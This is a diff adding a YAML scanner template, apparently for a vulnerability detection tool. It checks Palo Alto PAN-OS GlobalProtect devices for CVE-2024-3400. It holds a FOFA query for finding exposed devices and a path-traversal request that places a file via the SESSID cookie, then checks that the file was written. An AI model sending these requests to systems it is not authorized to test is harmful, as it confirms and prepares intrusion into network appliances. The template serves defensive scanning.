@@ -1,0 +1,22 @@
+id: poc-yaml-palo-alto-networks-pan-os-globalprotect-command-injection
+info:
+  name: Palo Alto Networks PAN-OS GlobalProtect 命令注入漏洞(CVE-2024-3400)
+  severity: critical
+  tags:
+  - CVE-2024-3400
+  - 两高一弱
+  finger: pan-os
+  fofa: icon_hash="-631559155" && header="SESSID" && header="X-Frame-Options\x3a DENY"
+variables:
+  t1: random_str(5)
+requests:
+- method: GET
+  path: /global-protect/login.esp
+  headers:
+    Cookie: SESSID=./../../../var/appweb/sslvpndocs/global-protect/portal/js/jq{{.t1}}.min.js
+  expression: status_code == 200 && contains(body,"GlobalProtect Portal")
+- method: GET
+  path: /global-protect/portal/js/jq{{.t1}}.min.js
+  expression: (status_code == 200 && body == "") || (status_code == 403 && title ==
+    "403 Forbidden")
+transport: http
